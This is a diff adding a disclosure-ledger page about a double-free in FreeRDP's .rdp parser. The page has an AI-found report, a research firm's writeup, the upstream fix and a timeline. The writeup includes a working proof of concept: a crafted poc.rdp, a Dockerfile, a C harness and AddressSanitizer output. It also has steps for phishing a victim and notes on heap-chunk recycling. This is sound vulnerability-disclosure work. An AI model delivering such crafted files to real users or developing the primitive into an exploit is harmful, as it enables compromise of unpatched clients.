@@ -1,0 +1,429 @@
+<!doctype html>
+<html lang="en">
+<head>
+<meta charset="utf-8">
+<meta name="viewport" content="width=device-width, initial-scale=1">
+<title>ANT-2026-XQVPKKPB · freerdp/freerdp</title>
+<link rel="icon" type="image/x-icon" href="/anthropic-serve/favicon.ico">
+<script>(function(){try{var t=localStorage.getItem("cvd_theme");if(t==="light"||t==="dark")document.documentElement.setAttribute("data-theme",t);}catch(e){}})();</script>
+<link rel="stylesheet" href="../assets/site.css">
+<link rel="stylesheet" href="../assets/ledger.css">
+</head>
+<body>
+<!-- Google tag (gtag.js) -->
+<script async src="https://www.googletagmanager.com/gtag/js?id=G-MT0111843S"></script><script>
+  window.dataLayer = window.dataLayer || [];
+  function gtag() { dataLayer.push(arguments); }
+  gtag('js', new Date());
+  gtag('config', 'G-MT0111843S');
+</script>
+<main>
+<h1>ANT-2026-XQVPKKPB · freerdp/freerdp</h1>
+<nav class="site-nav muted">
+<a href="../index.html">Overview</a>  ·
+<a href="../ledger/index.html">Ledger</a>  ·
+<a href="../archive/index.html">Archive</a>  ·
+<a href="../about/index.html">About</a>  <span class="theme-toggle">
+    <button type="button" data-set-theme="light">Light</button>
+    <button type="button" data-set-theme="dark">Dark</button>
+    <button type="button" data-set-theme="system">System</button>
+  </span>
+</nav>
+<h2>
+  use-after-free
+  <span class="sev-badge sev-high">high</span>
+</h2>
+
+<p class="id-badges">
+  <a class="id-badge" href="https://nvd.nist.gov/vuln/detail/CVE-2026-64621">CVE-2026-64621</a>
+  <a class="id-badge" href="https://github.com/FreeRDP/FreeRDP/security/advisories/GHSA-f27x-frr8-j9hc">GHSA-f27x-frr8-j9hc</a>
+</p>
+
+<p class="sev-compare">
+  <span class="sev-compare-label">Severity</span>
+  <span class="sev-compare-item">Claude <span class="sev-chip sev-high">high</span></span>
+  <span class="sev-compare-sep">·</span>
+  <span class="sev-compare-item">Security research firm <span class="sev-chip sev-high">high</span></span>
+  <span class="sev-compare-sep">·</span>
+  <span class="sev-compare-item">Maintainer <span class="sev-chip sev-unknown">-</span></span>
+</p>
+
+<p class="attribution">Discovered by
+<span class="model-chip">Claude Mythos Preview</span></p>
+
+
+<div class="marker">REPORT</div>
+<p class="section-intro">Anthropic's analysis, sealed at approval. Disclosure to the maintainer was performed by Ada Logics.</p>
+<div class="report-body" tabindex="0"><h1>ANT-2026-XQVPKKPB: Double-free of MonitorIds when parsing malformed selectedmonitors</h1>
+<p>In client/common/file.c, freerdp_client_rdp_file_apply_to_settings() obtains a raw (non-copied) pointer to settings-&gt;MonitorIds via freerdp_settings_get_pointer_writable() and, on the strtoul-overflow error path at line 2536, calls free(list) on that buffer without clearing the owning settings-&gt;MonitorIds pointer. When the error propagates up, freerdp_settings_free() later frees the same buffer again via freerdp_settings_set_pointer_len() in libfreerdp/common/settings.c:1442-1443. The attacker controls the freed chunk size through the number of comma-separated tokens preceding the overflowing value, and numerous heap operations occur between the two frees, enabling chunk recycling and an overlapping-allocation primitive rather than an immediate tcache abort. The only precondition is that the victim opens a crafted .rdp file, a well-known untrusted distribution vector parsed directly from argv.</p>
+<h2>Target</h2>
+<p><strong>Project:</strong> freerdp/freerdp<br>
+<strong>Location:</strong> <code>client/common/file.c:2536</code><br>
+<strong>Discovery:</strong> static analysis — not yet dynamically reproduced  </p>
+<h2>Technical Details</h2>
+<p>freerdp_settings_get_pointer_writable() returns the raw settings-&gt;MonitorIds pointer (settings_getters.c:4145-4146), not a copy, so ownership remains with the settings object. When a selectedmonitors token overflows strtoul (val &gt;= UINT32_MAX with errno set), the error branch at file.c:2536 calls free(list) directly and returns FALSE, but settings-&gt;MonitorIds still points to the freed memory. During client teardown (freerdp_client_context_free → rdp_free → freerdp_settings_free → freerdp_settings_free_keys), the dangling MonitorIds pointer is passed to free() a second time at libfreerdp/common/settings.c:1442-1443, producing a double-free.</p>
+<h2>Reproduction</h2>
+<ol>
+<li>Craft a .rdp file containing e.g. <code>selectedmonitors:s:99999999999999999999999</code> (optionally preceded by N comma-separated tokens to control chunk size).</li>
+<li>Deliver the .rdp file to the victim (phishing/download); FreeRDP parses .rdp files directly from argv (cmdline.c:5693).</li>
+<li>During parsing, strtoul overflows (ULONG_MAX with errno=ERANGE), hitting the <code>(val &gt;= UINT32_MAX) &amp;&amp; (errno != 0)</code> branch which calls free(list) on the live settings-&gt;MonitorIds buffer and returns FALSE.</li>
+<li>The error propagates up and the client calls freerdp_client_context_free → freerdp_settings_free, which frees the dangling MonitorIds pointer a second time at settings.c:1442-1443.</li>
+<li>Intervening heap activity (freerdp_client_rdp_file_free string frees, status printing, ContextFree callbacks) recycles the chunk between the two frees, yielding an overlapping-allocation primitive.</li>
+</ol>
+<p><em>[No reproducer or sanitizer output attached — request from security-cvd@anthropic.com if needed.]</em></p>
+<h2>Suggested Fix</h2>
+<p>On parse failure do not free buffers still owned by the settings object: replace free(list) with freerdp_settings_set_pointer_len(settings, FreeRDP_MonitorIds, nullptr, 0), or clear settings-&gt;MonitorIds before freeing so the destructor releases it exactly once.</p>
+<h2>Acknowledgement</h2>
+<p>This vulnerability was discovered by Claude, Anthropic's AI assistant, and triaged by the Anthropic security team in collaboration with Anthropic Research. Please direct questions to security-cvd@anthropic.com and reference ANT-2026-XQVPKKPB.</p>
+<hr>
+<p><strong>Reference:</strong> ANT-2026-XQVPKKPB<br>
+<strong>Anthropic CVD Policy:</strong> https://www.anthropic.com/coordinated-vulnerability-disclosure</p></div>
+
+<div class="marker">SECURITY RESEARCH FIRM ANALYSIS</div>
+<p class="section-intro">Triage and disclosure were performed by Ada Logics. The writeup below is the document the firm sent to the maintainer.</p>
+<dl class="vendor-analysis">
+<dt>Verdict</dt><dd><span class="verdict-chip verdict-tp">true positive</span></dd><dt>Severity</dt><dd class="sev-high">high</dd></dl>
+<div class="report-body" tabindex="0"><h2>Summary</h2>
+<p>When a FreeRDP client opens a <code>.rdp</code> connection file, <code>freerdp_client_rdp_file_apply_to_settings()</code>
+(<code>client/common/file.c</code>) parses the <code>selectedmonitors</code> field into <code>settings-&gt;MonitorIds</code>.
+It allocates that array through the settings object, then takes a <strong>raw, non-owning</strong>
+pointer to it via <code>freerdp_settings_get_pointer_writable()</code>. On the <code>strtoul</code>-overflow
+error path it calls <code>free(list)</code> on that raw pointer <strong>without clearing
+<code>settings-&gt;MonitorIds</code></strong>. The parse fails, the client tears down its <code>rdpSettings</code>, and
+<code>freerdp_settings_free()</code> frees the same now-dangling buffer a <strong>second time</strong> — an
+attacker-influenced double-free (CWE-415).</p>
+<p>The attacker controls the freed chunk's size (number of comma-separated tokens), and there
+is substantial heap activity between the two frees, so this is a size-controlled
+double-free / overlapping-allocation primitive rather than a benign immediate abort. It is
+reachable in the <strong>default</strong> configuration of every FreeRDP CLI client
+(<code>xfreerdp</code> / <code>sdl-freerdp</code> / <code>wlfreerdp</code>) by getting a victim to open an
+attacker-supplied <code>.rdp</code> file.</p>
+<h2>Affected versions</h2>
+<ul>
+<li><strong>FreeRDP 3.x</strong> — present in the latest release tag <strong>3.27.1</strong> (and 3.27.0) and on
+  <strong><code>master</code></strong> (HEAD <code>1f7a716d39b5605bb8a83b0c3c97a6ce386609ef</code>, reproduced 2026-07-01).
+  Unpatched. <code>free(list)</code> on the <code>MonitorIds</code> error path is at <code>client/common/file.c:2536</code>
+  in all of them. (No <code>stable-3.0</code> branch exists; 3.x ships as tags off <code>master</code>, and the
+  bug is in the released 3.27.1 tag — so it is not dev-branch-only.)</li>
+<li>No special build flags required (stock <code>client-common</code>).</li>
+</ul>
+<h2>Details</h2>
+<h3>Vulnerable code</h3>
+<p><code>client/common/file.c</code>, <code>freerdp_client_rdp_file_apply_to_settings()</code>:</p>
+<pre tabindex="0"><code class="language-c">if (~(size_t)file-&gt;SelectedMonitors)
+{
+    size_t count = 0;
+    char** ptr = CommandLineParseCommaSeparatedValues(file-&gt;SelectedMonitors, &amp;count);
+    UINT32* list = nullptr;
+
+    if (!freerdp_settings_set_pointer_len(settings, FreeRDP_MonitorIds, nullptr, count)) // (1) settings-&gt;MonitorIds = calloc(count,4)
+    { CommandLineParserFree(ptr); return FALSE; }
+
+    list = freerdp_settings_get_pointer_writable(settings, FreeRDP_MonitorIds);          // (2) RAW pointer == settings-&gt;MonitorIds (NOT a copy)
+    if (!list &amp;&amp; (count &gt; 0)) { CommandLineParserFree(ptr); return FALSE; }
+
+    for (size_t x = 0; x &lt; count; x++)
+    {
+        unsigned long val = 0;
+        errno = 0;
+        val = strtoul(ptr[x], nullptr, 0);
+        if ((val &gt;= UINT32_MAX) &amp;&amp; (errno != 0))
+        {
+            CommandLineParserFree(ptr);
+            free(list);                        // (3) file.c:2536 — frees settings-&gt;MonitorIds; owning field NOT cleared
+            return FALSE;
+        }
+        list[x] = (UINT32)val;
+    }
+    CommandLineParserFree(ptr);
+}
+</code></pre>
+<p><code>freerdp_settings_get_pointer_writable(FreeRDP_MonitorIds)</code> returns <code>settings-&gt;MonitorIds</code>
+verbatim (<code>settings_getters.c</code>), so <code>list</code> <strong>is</strong> the settings-owned allocation. <code>free(list)</code>
+at file.c:2536 leaves <code>settings-&gt;MonitorIds</code> dangling.</p>
+<p>At teardown, <code>freerdp_settings_free → freerdp_settings_free_internal → freerdp_settings_free_keys</code>
+walks each pointer field and calls <code>freerdp_settings_set_pointer_len(..., FreeRDP_MonitorIds, NULL, 0)</code>,
+which reaches:</p>
+<pre tabindex="0"><code class="language-c">// libfreerdp/common/settings.c:1375-1382 — freerdp_settings_set_pointer_len_()
+void* old = freerdp_settings_get_pointer_writable(settings, id);   // the dangling MonitorIds
+free(old);                                                         // settings.c:1382 — SECOND free
+</code></pre>
+<p>The overflow trigger is reliable: for a token like <code>99999999999999999999999</code>, <code>strtoul</code>
+returns <code>ULONG_MAX</code> (<code>&gt;= UINT32_MAX</code>) and sets <code>errno = ERANGE</code> (<code>!= 0</code>), satisfying the
+error condition.</p>
+<h3>Root cause</h3>
+<p>The error path frees a buffer still owned by <code>settings-&gt;MonitorIds</code> without nulling the
+owning field, breaking the single-owner invariant <code>freerdp_settings_free()</code> relies on.</p>
+<h3>Server-independent call path (from the CLI entry point)</h3>
+<pre tabindex="0"><code>main(argv = {&quot;xfreerdp&quot;,&quot;poc.rdp&quot;})
+  freerdp_client_settings_parse_command_line_arguments        client/common/cmdline.c:6011
+    ..._int  (option_is_rdp_file(argv[1]) -&gt; connection-file path)  cmdline.c:5719
+      freerdp_client_settings_parse_connection_file            client/common/client.c:385
+        freerdp_client_populate_settings_from_rdp_file(_unchecked)  client/common/file.c:2726
+          free(list)                                           client/common/file.c:2536   &lt;-- FIRST free
+  ...parse returns error...
+  freerdp_settings_free(settings)
+    freerdp_settings_free_keys -&gt; freerdp_settings_set_pointer_len_  common/settings.c:1382  &lt;-- SECOND free
+</code></pre>
+<h2>Impact</h2>
+<p>A single crafted <code>.rdp</code> file, opened by the victim with any FreeRDP CLI client in the
+default build, double-frees a heap chunk whose size the attacker selects (via token count).
+Because the client performs substantial heap activity between the two frees (freeing the
+many parsed <code>.rdp</code> string fields, context teardown, status printing), the freed chunk can
+be recycled before the second free on a real glibc heap — turning a tcache double-free
+abort into an overlapping-allocation (aliasing) primitive. Full RCE on a hardened allocator
+is plausible but not demonstrated; this is a size-controlled double-free reachable from an
+untrusted file with no CFI-bypass shown → <strong>High</strong>. No authentication; requires the victim
+to open the file (normal usage for connection files).</p>
+<h2>Proof of Concept</h2>
+<p>Self-contained Docker reproducer. It builds <code>libfreerdp</code> + <code>winpr</code> + <code>client-common</code> under
+AddressSanitizer at the affected commit, and a small consumer that invokes the <strong>exact
+public top-level parser the shipped CLI clients call from <code>main()</code></strong> —
+<code>freerdp_client_settings_parse_command_line_arguments(settings, {"xfreerdp","poc.rdp"})</code> —
+then frees the settings object on the parse error, exactly as the clients do on teardown.
+(The library API is used only to avoid the X11/SDL/network layers irrelevant to <code>.rdp</code>
+parsing; the code path, frames, and ownership are identical to <code>xfreerdp poc.rdp</code>.)</p>
+<p><strong><code>poc.rdp</code></strong></p>
+<pre tabindex="0"><code>full address:s:127.0.0.1:3389
+selectedmonitors:s:0,1,2,99999999999999999999999
+</code></pre>
+<p><strong><code>Dockerfile</code></strong></p>
+<pre tabindex="0"><code class="language-dockerfile">FROM ubuntu:24.04
+ENV DEBIAN_FRONTEND=noninteractive
+ARG TARGET_COMMIT=1f7a716d39b5605bb8a83b0c3c97a6ce386609ef
+ARG CLANG_VERSION=20
+
+RUN apt-get update &amp;&amp; apt-get install -y --no-install-recommends \
+        ca-certificates git make cmake ninja-build pkg-config libc6-dev \
+        wget gnupg lsb-release software-properties-common \
+        libssl-dev zlib1g-dev libicu-dev libcjson-dev \
+    &amp;&amp; wget -qO /tmp/llvm.sh https://apt.llvm.org/llvm.sh &amp;&amp; chmod +x /tmp/llvm.sh &amp;&amp; /tmp/llvm.sh ${CLANG_VERSION} \
+    &amp;&amp; apt-get install -y --no-install-recommends clang-${CLANG_VERSION} llvm-${CLANG_VERSION} libclang-rt-${CLANG_VERSION}-dev \
+    &amp;&amp; rm -rf /var/lib/apt/lists/*
+
+ENV CC=clang-${CLANG_VERSION} CXX=clang++-${CLANG_VERSION}
+ENV CFLAGS=&quot;-g -fno-omit-frame-pointer -O1 -fsanitize=address&quot;
+ENV CXXFLAGS=&quot;-g -fno-omit-frame-pointer -O1 -fsanitize=address&quot;
+ENV LDFLAGS=&quot;-fsanitize=address&quot;
+
+RUN git clone https://github.com/freerdp/freerdp /src/repo
+WORKDIR /src/repo
+RUN git checkout ${TARGET_COMMIT}
+
+# libfreerdp + winpr + client-common (where the bug lives), ASan, shared libs, LTO off,
+# no GUI clients / no server.
+RUN cmake -GNinja -S /src/repo -B /build \
+        -DCMAKE_BUILD_TYPE=Debug \
+        -DCMAKE_INTERPROCEDURAL_OPTIMIZATION=OFF \
+        -DCMAKE_C_COMPILER=clang-${CLANG_VERSION} -DCMAKE_CXX_COMPILER=clang++-${CLANG_VERSION} \
+        -DCMAKE_C_FLAGS=&quot;$CFLAGS&quot; -DCMAKE_CXX_FLAGS=&quot;$CXXFLAGS&quot; \
+        -DCMAKE_EXE_LINKER_FLAGS=&quot;$LDFLAGS&quot; -DCMAKE_SHARED_LINKER_FLAGS=&quot;$LDFLAGS&quot; \
+        -DCMAKE_INSTALL_PREFIX=/usr/local -DBUILD_SHARED_LIBS=ON -DBUILD_TESTING=OFF \
+        -DWITH_SAMPLE=OFF -DWITH_SERVER=OFF -DWITH_CLIENT=OFF -DWITH_CLIENT_COMMON=ON \
+        -DWITH_CLIENT_SDL=OFF -DWITH_X11=OFF -DWITH_WAYLAND=OFF \
+        -DWITH_PULSE=OFF -DWITH_CUPS=OFF -DWITH_PCSC=OFF -DWITH_FFMPEG=OFF -DWITH_SWSCALE=OFF \
+        -DWITH_OPUS=OFF -DWITH_KRB5=OFF -DWITH_GSSAPI=OFF -DWITH_FUSE=OFF \
+        -DWITH_URBDRC=OFF -DCHANNEL_URBDRC=OFF -DWITH_DRIVE=OFF -DWITH_VIDEO_FFMPEG=OFF \
+    &amp;&amp; cmake --build /build &amp;&amp; cmake --install /build
+RUN ldconfig
+
+COPY harness.c /tmp/harness.c
+COPY poc.rdp /tmp/poc.rdp
+RUN $CC $CFLAGS -I/usr/local/include -I/usr/local/include/freerdp3 -I/usr/local/include/winpr3 \
+        /tmp/harness.c -o /tmp/poc_run \
+        -L/usr/local/lib -lfreerdp-client3 -lfreerdp3 -lwinpr3 $LDFLAGS
+
+ENV LD_LIBRARY_PATH=/usr/local/lib
+ENV ASAN_OPTIONS=detect_leaks=0:abort_on_error=1:symbolize=1
+ENV ASAN_SYMBOLIZER_PATH=/usr/lib/llvm-${CLANG_VERSION}/bin/llvm-symbolizer
+CMD [&quot;/bin/sh&quot;,&quot;-c&quot;,&quot;/tmp/poc_run /tmp/poc.rdp 2&gt;&amp;1; echo EXIT=$?&quot;]
+</code></pre>
+<p><strong><code>harness.c</code></strong> — drives the exact CLI parser + teardown</p>
+<pre tabindex="0"><code class="language-c">/* Real consumer of the FreeRDP client library: drives the exact public entry point the
+ * shipped CLI clients invoke from main(), with argv = {&quot;xfreerdp&quot;,&quot;&lt;file.rdp&gt;&quot;}. The parser
+ * detects the &quot;.rdp&quot; extension and routes to freerdp_client_rdp_file_apply_to_settings(),
+ * where the malformed selectedmonitors token overflows strtoul and the error branch at
+ * client/common/file.c:2536 free()s the live settings-&gt;MonitorIds without clearing the
+ * owning pointer. Client teardown (freerdp_settings_free) then frees it a second time. */
+#include &lt;stdio.h&gt;
+#include &lt;freerdp/client.h&gt;
+#include &lt;freerdp/client/cmdline.h&gt;
+#include &lt;freerdp/settings.h&gt;
+
+int main(int argc, char** argv)
+{
+    const char* rdp = (argc &gt; 1) ? argv[1] : &quot;/tmp/poc.rdp&quot;;
+
+    rdpSettings* settings = freerdp_settings_new(0);
+    if (!settings) { fprintf(stderr, &quot;freerdp_settings_new failed\n&quot;); return 2; }
+
+    char prog[] = &quot;xfreerdp&quot;;
+    char file[4096];
+    snprintf(file, sizeof(file), &quot;%s&quot;, rdp);
+    char* av[] = { prog, file, NULL };
+
+    int rc = freerdp_client_settings_parse_command_line_arguments(settings, 2, av, FALSE);
+    fprintf(stderr, &quot;parse_command_line_arguments returned %d (error expected)\n&quot;, rc);
+
+    /* Client teardown: settings-&gt;MonitorIds was already free()'d on the error path
+     * -&gt; second free here. */
+    freerdp_settings_free(settings);
+    fprintf(stderr, &quot;settings freed cleanly (NO double-free detected)\n&quot;);
+    return 0;
+}
+</code></pre>
+<p><strong>Run</strong></p>
+<pre tabindex="0"><code class="language-sh">docker build -t freerdp-monitorids-doublefree .
+docker run --rm freerdp-monitorids-doublefree
+</code></pre>
+<p><strong>Observed output (AddressSanitizer, current <code>master</code> <code>1f7a716d</code>)</strong></p>
+<pre tabindex="0"><code>parse_command_line_arguments returned -1002 (error expected)
+==7==ERROR: AddressSanitizer: attempting double-free on 0x7b8df67fef50 in thread T0:
+    #1 freerdp_settings_set_pointer_len_ /src/repo/libfreerdp/common/settings.c:1382:2
+    #2 freerdp_settings_free_keys        /src/repo/libfreerdp/common/settings_str.c:348:10
+    #4 freerdp_settings_free             /src/repo/libfreerdp/core/settings.c:1397:2
+    #5 main                              /tmp/harness.c:50:2
+0x7b8df67fef50 is located 0 bytes inside of 16-byte region [...]
+freed by thread T0 here:
+    #1 freerdp_client_populate_settings_from_rdp_file_unchecked /src/repo/client/common/file.c:2536:5
+    ... freerdp_client_settings_parse_command_line_arguments    .../cmdline.c:6011
+previously allocated by thread T0 here:
+    #1 freerdp_settings_set_pointer_len_ /src/repo/libfreerdp/common/settings.c:1395:9
+    #2 freerdp_client_populate_settings_from_rdp_file_unchecked /src/repo/client/common/file.c:2517:8
+SUMMARY: AddressSanitizer: double-free /src/repo/libfreerdp/common/settings.c:1382 in freerdp_settings_set_pointer_len_
+EXIT=134
+</code></pre>
+<p>The three stacks show the same 16-byte chunk allocated at settings.c:1395 (from file.c:2517),
+freed first at file.c:2536, and freed again at settings.c:1382 during <code>freerdp_settings_free</code>.</p>
+<h2>Suggested fix</h2>
+<p>Do not free a buffer still owned by the settings object — release it through the settings
+API so the owning field is cleared and the destructor frees it exactly once:</p>
+<pre tabindex="0"><code class="language-diff">--- a/client/common/file.c
++++ b/client/common/file.c
+@@ freerdp_client_rdp_file_apply_to_settings()
+             if ((val &gt;= UINT32_MAX) &amp;&amp; (errno != 0))
+             {
+                 CommandLineParserFree(ptr);
+-                free(list);
++                /* settings still owns this buffer; clear it through the API so the
++                   destructor frees it exactly once. Do not free the raw getter result. */
++                freerdp_settings_set_pointer_len(settings, FreeRDP_MonitorIds, NULL, 0);
+                 return FALSE;
+             }
+</code></pre>
+<p><strong>Fix-verified:</strong> with this one-line change, the same PoC completes cleanly
+(<code>settings freed cleanly (NO double-free detected)</code>, <code>EXIT=0</code>) — the ASan double-free no
+longer fires (<code>freerdp_settings_set_pointer_len</code> frees the current <code>MonitorIds</code> and sets the
+pointer to NULL / length 0, so teardown frees nothing).</p>
+<h2>References</h2>
+<ul>
+<li><code>client/common/file.c</code> — <code>freerdp_client_rdp_file_apply_to_settings()</code> (<code>free(list)</code> at :2536; alloc at :2517).</li>
+<li><code>libfreerdp/common/settings.c:1375-1382</code> (<code>freerdp_settings_set_pointer_len_</code> second free); <code>settings_str.c</code> (teardown walk); <code>settings_getters.c</code> (<code>get_pointer_writable</code> returns the raw field).</li>
+<li><code>client/common/client.c</code> (<code>parse_connection_file</code>), <code>client/common/cmdline.c</code> (<code>option_is_rdp_file</code>, top-level parser).</li>
+<li>CWE-415 (Double Free).</li>
+</ul>
+<h2>Attribution</h2>
+<p>please credit <strong>Claude</strong> and <strong>Ada Logics</strong> — found by Anthropic using agents
+to study the security of open-source projects, with Ada Logics validating and reporting.</p>
+<h2>Disclosure</h2>
+<p>This report follows a 90-day coordinated disclosure timeline as per https://www.anthropic.com/coordinated-vulnerability-disclosure </p></div>
+
+
+<div class="marker">UPSTREAM FIX</div>
+<p class="section-intro">The change that resolved this finding.</p>
+<div class="diff-block"><pre class="diff" tabindex="0"><code><span class="diff-h">diff --git a/client/common/file.c b/client/common/file.c</span>
+<span class="diff-h">index dc8af42fb1ba..dcd17899de0a 100644</span>
+<span class="diff-h">--- a/client/common/file.c</span>
+<span class="diff-h">+++ b/client/common/file.c</span>
+<span class="diff-h">@@ -2533,7 +2533,6 @@ BOOL freerdp_client_populate_settings_from_rdp_file_unchecked(const rdpFile* fil</span>
+<span class="diff-c"> 			if ((val &gt;= UINT32_MAX) &amp;&amp; (errno != 0))</span>
+<span class="diff-c"> 			{</span>
+<span class="diff-c"> 				CommandLineParserFree(ptr);</span>
+<span class="diff-d">-				free(list);</span>
+<span class="diff-c"> 				return FALSE;</span>
+<span class="diff-c"> 			}</span>
+<span class="diff-c"> 			list[x] = (UINT32)val;</span></code></pre></div>
+<p class="kicker"><a href="https://github.com/FreeRDP/FreeRDP/commit/7696267929ae8ba045c1bbe275b3915653828313" rel="noopener noreferrer">https://github.com/FreeRDP/FreeRDP/commit/7696267929ae8ba045c1bbe275b3915653828313</a></p>
+
+
+
+<div class="marker">TIMELINE</div>
+<p class="section-intro">Recorded dates, in order.</p>
+<div class="figure">
+  <ol class="timeline">
+    <li class="timeline-pt">
+      <span class="timeline-dot"></span>
+      <span class="timeline-date">2026-04-02</span>
+      <span class="timeline-label">Discovered or logged</span>
+    </li>
+    <li class="timeline-pt">
+      <span class="timeline-dot"></span>
+      <span class="timeline-date">2026-07-06</span>
+      <span class="timeline-label">Patch released</span>
+    </li>
+    <li class="timeline-pt">
+      <span class="timeline-dot"></span>
+      <span class="timeline-date">2026-07-22</span>
+      <span class="timeline-label">Sent to maintainer</span>
+    </li>
+    <li class="timeline-pt">
+      <span class="timeline-dot"></span>
+      <span class="timeline-date">2026-07-22</span>
+      <span class="timeline-label">Maintainer acknowledged</span>
+    </li>
+    <li class="timeline-pt">
+      <span class="timeline-dot"></span>
+      <span class="timeline-date">2026-09-28</span>
+      <span class="timeline-label">Publicly revealed</span>
+    </li>
+  </ol>
+</div>
+
+<div class="marker">PROVENANCE</div>
+<p class="kicker">SHA-3-512 hash:</p>
+<p class="hash full">3a90d073b15799d00f35445781c7d4cf2389ac6ed3dd751727e154c08ea2410bce55fabefc0ad71899fc5da0bcae17903a01978dcda2025fd15c999cc8c35adb</p>
+<p class="kicker">Committed 2026-07-22 07:29 UTC</p>
+<p class="kicker">Revealed 2026-09-28 21:48 UTC</p>
+<p class="kicker">
+  <a download="ANT-2026-XQVPKKPB-preimage.json"
+     href="data:application/json;charset=utf-8,%7B%22ant_id%22%3A%22ANT-2026-XQVPKKPB%22%2C%22bug_class%22%3A%22Double%20Free%20/%20Memory%20Corruption%22%2C%22claude_severity%22%3A%22high%22%2C%22commit_sha%22%3Anull%2C%22created_at%22%3A%222026-04-16T01%3A52%3A41%2B00%3A00%22%2C%22description%22%3A%22In%20client/common/file.c%2C%20freerdp_client_rdp_file_apply_to_settings%28%29%20obtains%20a%20raw%20%28non-copied%29%20pointer%20to%20settings-%3EMonitorIds%20via%20freerdp_settings_get_pointer_writable%28%29%20and%2C%20on%20the%20strtoul-overflow%20error%20path%20at%20line%202536%2C%20calls%20free%28list%29%20on%20that%20buffer%20without%20clearing%20the%20owning%20settings-%3EMonitorIds%20pointer.%20When%20the%20error%20propagates%20up%2C%20freerdp_settings_free%28%29%20later%20frees%20the%20same%20buffer%20again%20via%20freerdp_settings_set_pointer_len%28%29%20in%20libfreerdp/common/settings.c%3A1442-1443.%20The%20attacker%20controls%20the%20freed%20chunk%20size%20through%20the%20number%20of%20comma-separated%20tokens%20preceding%20the%20overflowing%20value%2C%20and%20numerous%20heap%20operations%20occur%20between%20the%20two%20frees%2C%20enabling%20chunk%20recycling%20and%20an%20overlapping-allocation%20primitive%20rather%20than%20an%20immediate%20tcache%20abort.%20The%20only%20precondition%20is%20that%20the%20victim%20opens%20a%20crafted%20.rdp%20file%2C%20a%20well-known%20untrusted%20distribution%20vector%20parsed%20directly%20from%20argv.%22%2C%22discovered_at%22%3A%222026-04-02T00%3A00%3A00%2B00%3A00%22%2C%22location%22%3A%22client/common/file.c%3A2536%22%2C%22poc_sha256%22%3Anull%2C%22preimage_version%22%3A1%2C%22project%22%3A%22freerdp/freerdp%22%2C%22reproduction%22%3A%5B%221.%20Craft%20a%20.rdp%20file%20containing%20e.g.%20%60selectedmonitors%3As%3A99999999999999999999999%60%20%28optionally%20preceded%20by%20N%20comma-separated%20tokens%20to%20control%20chunk%20size%29.%22%2C%222.%20Deliver%20the%20.rdp%20file%20to%20the%20victim%20%28phishing/download%29%3B%20FreeRDP%20parses%20.rdp%20files%20directly%20from%20argv%20%28cmdline.c%3A5693%29.%22%2C%223.%20During%20parsing%2C%20strtoul%20overflows%20%28ULONG_MAX%20with%20errno%3DERANGE%29%2C%20hitting%20the%20%60%28val%20%3E%3D%20UINT32_MAX%29%20%26%26%20%28errno%20%21%3D%200%29%60%20branch%20which%20calls%20free%28list%29%20on%20the%20live%20settings-%3EMonitorIds%20buffer%20and%20returns%20FALSE.%22%2C%224.%20The%20error%20propagates%20up%20and%20the%20client%20calls%20freerdp_client_context_free%20%E2%86%92%20freerdp_settings_free%2C%20which%20frees%20the%20dangling%20MonitorIds%20pointer%20a%20second%20time%20at%20settings.c%3A1442-1443.%22%2C%225.%20Intervening%20heap%20activity%20%28freerdp_client_rdp_file_free%20string%20frees%2C%20status%20printing%2C%20ContextFree%20callbacks%29%20recycles%20the%20chunk%20between%20the%20two%20frees%2C%20yielding%20an%20overlapping-allocation%20primitive.%22%5D%2C%22technical_details%22%3A%22freerdp_settings_get_pointer_writable%28%29%20returns%20the%20raw%20settings-%3EMonitorIds%20pointer%20%28settings_getters.c%3A4145-4146%29%2C%20not%20a%20copy%2C%20so%20ownership%20remains%20with%20the%20settings%20object.%20When%20a%20selectedmonitors%20token%20overflows%20strtoul%20%28val%20%3E%3D%20UINT32_MAX%20with%20errno%20set%29%2C%20the%20error%20branch%20at%20file.c%3A2536%20calls%20free%28list%29%20directly%20and%20returns%20FALSE%2C%20but%20settings-%3EMonitorIds%20still%20points%20to%20the%20freed%20memory.%20During%20client%20teardown%20%28freerdp_client_context_free%20%E2%86%92%20rdp_free%20%E2%86%92%20freerdp_settings_free%20%E2%86%92%20freerdp_settings_free_keys%29%2C%20the%20dangling%20MonitorIds%20pointer%20is%20passed%20to%20free%28%29%20a%20second%20time%20at%20libfreerdp/common/settings.c%3A1442-1443%2C%20producing%20a%20double-free.%22%2C%22title%22%3A%22Double-free%20of%20MonitorIds%20when%20parsing%20malformed%20selectedmonitors%22%2C%22vendor_severity%22%3A%22high%22%7D">Verify (download preimage.json)</a>
+</p>
+<details class="preimage">
+  <summary>Show preimage JSON</summary>
+  <pre class="preimage-body">{
+  &#34;ant_id&#34;: &#34;ANT-2026-XQVPKKPB&#34;,
+  &#34;bug_class&#34;: &#34;Double Free / Memory Corruption&#34;,
+  &#34;claude_severity&#34;: &#34;high&#34;,
+  &#34;commit_sha&#34;: null,
+  &#34;created_at&#34;: &#34;2026-04-16T01:52:41+00:00&#34;,
+  &#34;description&#34;: &#34;In client/common/file.c, freerdp_client_rdp_file_apply_to_settings() obtains a raw (non-copied) pointer to settings-&gt;MonitorIds via freerdp_settings_get_pointer_writable() and, on the strtoul-overflow error path at line 2536, calls free(list) on that buffer without clearing the owning settings-&gt;MonitorIds pointer. When the error propagates up, freerdp_settings_free() later frees the same buffer again via freerdp_settings_set_pointer_len() in libfreerdp/common/settings.c:1442-1443. The attacker controls the freed chunk size through the number of comma-separated tokens preceding the overflowing value, and numerous heap operations occur between the two frees, enabling chunk recycling and an overlapping-allocation primitive rather than an immediate tcache abort. The only precondition is that the victim opens a crafted .rdp file, a well-known untrusted distribution vector parsed directly from argv.&#34;,
+  &#34;discovered_at&#34;: &#34;2026-04-02T00:00:00+00:00&#34;,
+  &#34;location&#34;: &#34;client/common/file.c:2536&#34;,
+  &#34;poc_sha256&#34;: null,
+  &#34;preimage_version&#34;: 1,
+  &#34;project&#34;: &#34;freerdp/freerdp&#34;,
+  &#34;reproduction&#34;: [
+    &#34;1. Craft a .rdp file containing e.g. `selectedmonitors:s:99999999999999999999999` (optionally preceded by N comma-separated tokens to control chunk size).&#34;,
+    &#34;2. Deliver the .rdp file to the victim (phishing/download); FreeRDP parses .rdp files directly from argv (cmdline.c:5693).&#34;,
+    &#34;3. During parsing, strtoul overflows (ULONG_MAX with errno=ERANGE), hitting the `(val &gt;= UINT32_MAX) &amp;&amp; (errno != 0)` branch which calls free(list) on the live settings-&gt;MonitorIds buffer and returns FALSE.&#34;,
